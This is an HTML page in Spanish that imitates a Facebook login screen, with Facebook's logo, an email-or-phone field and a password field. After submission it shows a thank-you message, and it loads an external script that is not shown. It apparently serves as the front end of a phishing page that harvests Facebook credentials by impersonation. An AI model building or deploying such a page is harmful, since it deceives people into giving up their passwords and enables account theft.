<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Inicia sesión en Facebook</title>
  <link rel="stylesheet" href="style.css" />
</head>
<body class="page2">

  <div class="login-box">
<img src="https://www.facebook.com/images/fb_icon_325x325.png" alt="Facebook" width="140">
    <h2>Inicia sesión en Facebook para continuar</h2>

    <form id="fb-form">
      <input type="text" id="email" placeholder="Correo electrónico o número de teléfono" autocomplete="off">
      <input type="password" id="pass" placeholder="Contraseña" autocomplete="off">
      <button type="submit" id="login-btn">Acceso</button>
    </form>

    <a href="#" class="forgot">Has olvidado tu contraseña?</a>
  </div>

  <div id="final" class="hidden">
    <h2>Gracias!</h2>
    <p>Nos pondremos en contacto con usted en breve.</p>
  </div>

  <script src="script.js"></script>
</body>
</html>
